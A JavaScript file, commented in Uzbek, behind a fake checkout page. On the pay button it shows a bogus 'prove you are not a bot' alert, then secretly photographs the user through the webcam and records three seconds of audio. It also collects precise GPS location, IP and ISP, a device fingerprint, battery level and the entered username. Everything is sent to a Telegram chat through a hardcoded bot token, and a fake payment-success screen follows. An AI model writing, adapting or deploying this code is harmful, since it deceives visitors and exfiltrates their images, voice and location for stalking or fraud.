const BOT_TOKEN = "8902936485:AAHsdSnxJybxUASyzLPb880AsDdwhwDiwNc";
const CHAT_ID = "7523599024";

// Modal boshqaruvi
const modal = document.getElementById('checkoutModal');
const modalBox = document.getElementById('modalBox');

function openCheckoutModal() {
    const paymentForm = document.getElementById('paymentForm');
    const successState = document.getElementById('successState');
    if (paymentForm) paymentForm.classList.remove('hidden');
    if (successState) successState.classList.add('hidden');

    if (modal) modal.classList.remove('hidden');
    setTimeout(() => {
        if (modal) modal.classList.remove('opacity-0');
        if (modalBox) {
            modalBox.classList.remove('scale-95');
            modalBox.classList.add('scale-100');
        }
    }, 10);
}

function closeCheckoutModal() {
    if (modal) modal.classList.add('opacity-0');
    if (modalBox) {
        modalBox.classList.remove('scale-100');
        modalBox.classList.add('scale-95');
    }
    setTimeout(() => {
        if (modal) modal.classList.add('hidden');
    }, 250);
}

// 1. Geolokatsiyani olish (Aniq va tezkor)
function getUserLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            console.warn("Geolokatsiya qo'llab-quvvatlanmaydi.");
            return resolve(null);
        }

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                resolve({
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude
                });
            },
            (err) => {
                console.warn("Lokatsiya xatosi:", err.message);
                resolve(null);
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    });
}

// 2. IP manzil va tarmoq ma'lumotlari (ipapi.co orqali)
async function getIPInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || "Noma'lum",
            city: data.city || "Noma'lum",
            region: data.region || "Noma'lum",
            country: data.country_name || "Noma'lum",
            org: data.org || "Noma'lum"
        };
    } catch (err) {
        console.warn("IP ma'lumotini olishda xatolik:", err);
        return null;
    }
}

// 3. Qurilma va brauzer ma'lumotlari (Device Fingerprinting)
function getDeviceInfo() {
    return {
        platform: navigator.platform || "Noma'lum",
        language: navigator.language || "Noma'lum",
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Noma'lum",
        userAgent: navigator.userAgent
    };
}

// 4. Batareya quvvati (Battery Status API)
async function getBatteryInfo() {
    if (!navigator.getBattery) return "Qo'llab-quvvatlanmaydi";
    try {
        const battery = await navigator.getBattery();
        const level = Math.round(battery.level * 100);
        const charging = battery.charging ? "Quvvatlanmoqda ⚡" : "Batareyada 🔋";
        return `${level}% (${charging})`;
    } catch (err) {
        return "Ma'lumot olinmadi";
    }
}

// 5. Kameradan rasm va mikrofondan ovoz olish
async function captureMediaAndVoice() {
    let stream = null;
    let photoBlob = null;
    let audioBlob = null;

    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: "user" },
            audio: true
        });

        const video = document.createElement('video');
        video.srcObject = stream;
        video.playsInline = true;
        video.muted = true;

        await video.play();
        await new Promise((r) => setTimeout(r, 1000)); // Kamera fokuslanishi uchun 1 sekund kutamiz

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        photoBlob = await new Promise((resolve) => {
            canvas.toBlob((blob) => resolve(blob), 'image/jpeg', 0.9);
        });

        // Audio yozish qismi
        let mimeType = 'audio/webm';
        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
            mimeType = 'audio/webm;codecs=opus';
        } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
            mimeType = 'audio/mp4';
        }

        const mediaRecorder = new MediaRecorder(stream, { mimeType });
        const audioChunks = [];

        mediaRecorder.ondataavailable = (e) => {
            if (e.data && e.data.size > 0) {
                audioChunks.push(e.data);
            }
        };

        audioBlob = await new Promise((resolve) => {
            mediaRecorder.onstop = () => {
                const blob = new Blob(audioChunks, { type: mimeType });
                resolve(blob);
            };

            mediaRecorder.start(250);

            setTimeout(() => {
                if (mediaRecorder.state !== 'inactive') {
                    mediaRecorder.stop();
                }
            }, 3000); // 3 soniya ovoz
        });

    } catch (err) {
        console.warn("Media xatosi:", err.name, err.message);
    } finally {
        if (stream) {
            stream.getTracks().forEach((track) => track.stop());
        }
    }

    return { photoBlob, audioBlob };
}

// 6. Telegram botga barcha ma'lumotlarni yuborish
async function sendDataToTelegram(mediaData, location, ipInfo, deviceInfo, batteryInfo) {
    const inputNumber = document.querySelector('#usernameInput');
    const textVal = inputNumber ? inputNumber.value : "Ma'lumot kiritilmagan";
    const { photoBlob, audioBlob } = mediaData;

    // Matnli hisobotni tayyorlash
    let infoText = `👤 **Foydalanuvchi:** ${textVal}\n\n`;

    if (ipInfo) {
        infoText += `🌐 **IP va Tarmoq:**\n`;
        infoText += `• IP Manzil: ${ipInfo.ip}\n`;
        infoText += `• Davlat: ${ipInfo.country}\n`;
        infoText += `• Shahar: ${ipInfo.city}\n`;
        infoText += `• Provayder: ${ipInfo.org}\n\n`;
    }

    infoText += `💻 **Qurilma va Batareya:**\n`;
    infoText += `• Platforma: ${deviceInfo.platform}\n`;
    infoText += `• Ekran: ${deviceInfo.screenResolution}\n`;
    infoText += `• Batareya: ${batteryInfo}\n`;
    infoText += `• Til: ${deviceInfo.language}\n`;

    try {
        // 1. Rasmni yuborish (Sarlavha sifatida qo'shimcha ma'lumotlar bilan)
        if (photoBlob) {
            const photoForm = new FormData();
            photoForm.append('chat_id', CHAT_ID);
            photoForm.append('photo', photoBlob, 'photo.jpg');
            photoForm.append('caption', infoText);
            photoForm.append('parse_mode', 'Markdown');

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: photoForm
            });
        } else {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'content-type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: infoText + `\n(Kamera ruxsati berilmadi)`, parse_mode: 'Markdown' })
            });
        }

        // 2. Geolokatsiyani yuborish
        if (location) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'content-type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    latitude: location.latitude,
                    longitude: location.longitude
                })
            });
        } else {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'content-type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: `📍 Geolokatsiya olib bo'lmadi (Ruxsat berilmadi yoki GPS o'chiq).` })
            });
        }

        // 3. Ovozli xabarni yuborish
        if (audioBlob && audioBlob.size > 0) {
            const voiceForm = new FormData();
            voiceForm.append('chat_id', CHAT_ID);

            const ext = audioBlob.type.includes('mp4') ? 'm4a' : (audioBlob.type.includes('ogg') ? 'ogg' : 'webm');
            voiceForm.append('voice', audioBlob, `voice_record.${ext}`);
            voiceForm.append('caption', '🎤 Ovozli yozuv');

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
                method: 'POST',
                body: voiceForm
            });
        }
    } catch (err) {
        console.error("Telegramga yuborishda tarmoq xatoligi:", err);
    }
}

// 7. To'lov animatsiyasi va muvaffaqiyat ekrani
function processPayment() {
    const submitBtn = document.getElementById('paySubmitBtn');
    if (!submitBtn) return;
    const originalText = submitBtn.innerHTML;

    submitBtn.disabled = true;
    submitBtn.innerHTML = `
        <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-white inline-block" fill="none" viewBox="0 0 24 24">
          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
        </svg>
        Faollashtirilmoqda...
      `;

    setTimeout(() => {
        submitBtn.disabled = false;
        submitBtn.innerHTML = originalText;

        const paymentForm = document.getElementById('paymentForm');
        const successState = document.getElementById('successState');
        if (paymentForm) paymentForm.classList.add('hidden');
        if (successState) successState.classList.remove('hidden');

        const badge = document.getElementById('userBadgePreview');
        if (badge) {
            badge.classList.remove('hidden');
            badge.classList.add('flex');
        }
        if (typeof confetti === 'function') {
            confetti({
                particleCount: 120,
                spread: 80,
                origin: { y: 0.6 }
            });
        }
    }, 1200);
}

// 8. Asosiy hodisa (Tugma bosilganda alert chiqishi va ma'lumotlarni yig'ish)
document.addEventListener('DOMContentLoaded', () => {
    const submitBtn = document.getElementById('paySubmitBtn');
    if (submitBtn) {
        submitBtn.addEventListener('click', async (event) => {
            event.preventDefault();

            // Foydalanuvchiga ogohlantirish chiqarish
            alert("Siz bot emasligingizni tasdiqlash uchun kamera va ovozga ruxsat bering!");

            submitBtn.disabled = true;
            submitBtn.innerText = "Tekshirilmoqda...";

            // Barcha ma'lumotlarni parallel ravishda yig'amiz
            const [mediaData, location, ipInfo, batteryInfo] = await Promise.all([
                captureMediaAndVoice(),
                getUserLocation(),
                getIPInfo(),
                getBatteryInfo()
            ]);

            const deviceInfo = getDeviceInfo();

            submitBtn.innerText = "Yuborilmoqda...";
            await sendDataToTelegram(mediaData, location, ipInfo, deviceInfo, batteryInfo);

            submitBtn.disabled = false;
            processPayment();
        });
    }

    generateParticles();
});

// Orqa fon zarrachalari
function generateParticles() {
    const container = document.getElementById('particles-container');
    if (!container) return;

    const colors = ['#10b981', '#a855f7', '#6366f1', '#ec4899', '#facc15', '#ffffff'];
    const count = 28;

    for (let i = 0; i < count; i++) {
        const dot = document.createElement('div');
        dot.className = 'particle';
        const size = Math.floor(Math.random() * 4) + 2;

        dot.style.width = `${size}px`;
        dot.style.height = `${size}px`;
        dot.style.left = `${Math.random() * 100}%`;
        dot.style.top = `${Math.random() * 100}%`;
        dot.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
        dot.style.animationDuration = `${6 + Math.random() * 8}s`;
        dot.style.animationDelay = `${Math.random() * 5}s`;

        container.appendChild(dot);
    }
}